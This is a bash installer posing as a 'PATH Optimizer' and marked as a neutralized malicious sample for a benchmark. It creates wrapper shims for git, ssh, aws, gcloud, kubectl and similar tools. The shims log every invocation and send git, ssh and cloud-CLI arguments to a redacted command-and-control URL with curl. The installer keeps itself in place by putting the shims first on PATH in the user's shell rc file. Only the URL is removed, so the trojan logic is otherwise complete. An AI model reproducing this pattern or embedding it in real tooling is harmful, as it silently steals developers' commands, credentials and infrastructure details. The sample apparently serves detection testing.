#!/bin/bash
# PATH Optimizer - Installation Script
# BENCHMARK_TEST_ONLY - Neutralized malicious sample

set -e

INSTALL_DIR="$HOME/.path-optimizer"
SHIM_DIR="$INSTALL_DIR/bin/shims"
BACKUP_DIR="$INSTALL_DIR/backups"

echo "Installing PATH Optimizer..."

# Create directories
mkdir -p "$INSTALL_DIR" "$SHIM_DIR" "$BACKUP_DIR"

# Backup current PATH
echo "$PATH" > "$BACKUP_DIR/path.backup.$(date +%Y%m%d)"

# Copy scripts
cp scripts/* "$INSTALL_DIR/"
cp hooks/* "$INSTALL_DIR/"

# [REDACTED] - Create malicious shims for common commands
create_shims() {
    local commands=("git" "ssh" "curl" "aws" "gcloud" "kubectl" "docker")

    for cmd in "${commands[@]}"; do
        local real_path=$(which "$cmd" 2>/dev/null)
        if [ -n "$real_path" ]; then
            # [REDACTED] - Create intercepting shim
            cat > "$SHIM_DIR/$cmd" << SHIMEOF
#!/bin/bash
# PATH Optimizer shim for $cmd

# [REDACTED] - Log command with arguments
log_command() {
    local logfile="$HOME/.path-optimizer/command.log"
    echo "\$(date +%Y-%m-%dT%H:%M:%S)|$cmd|\$*" >> "\$logfile"

    # [REDACTED] - Capture sensitive commands
    case "$cmd" in
        git)
            if [[ "\$*" =~ (push|clone|remote) ]]; then
                curl -s "[REDACTED_C2_URL]/git" -d "cmd=\$*&pwd=\$(pwd)" &
            fi
            ;;
        ssh)
            curl -s "[REDACTED_C2_URL]/ssh" -d "args=\$*&user=\$USER" &
            ;;
        aws|gcloud|kubectl)
            curl -s "[REDACTED_C2_URL]/cloud" -d "cmd=$cmd&args=\$*" &
            ;;
    esac
}

# Log and execute
log_command "\$@"
exec "$real_path" "\$@"
SHIMEOF
            chmod +x "$SHIM_DIR/$cmd"
        fi
    done
}

# [REDACTED] - Modify PATH to prioritize shims
inject_path() {
    local shell_rc
    if [ -n "$ZSH_VERSION" ] || [ -f "$HOME/.zshrc" ]; then
        shell_rc="$HOME/.zshrc"
    else
        shell_rc="$HOME/.bashrc"
    fi

    # [REDACTED] - Prepend shim directory to PATH
    if ! grep -q "path-optimizer" "$shell_rc" 2>/dev/null; then
        echo "" >> "$shell_rc"
        echo "# PATH Optimizer - Optimized PATH" >> "$shell_rc"
        echo 'export PATH="$HOME/.path-optimizer/bin/shims:$PATH"' >> "$shell_rc"
    fi
}

# Run installation
create_shims
inject_path

echo "PATH Optimizer installed! Please restart your terminal."
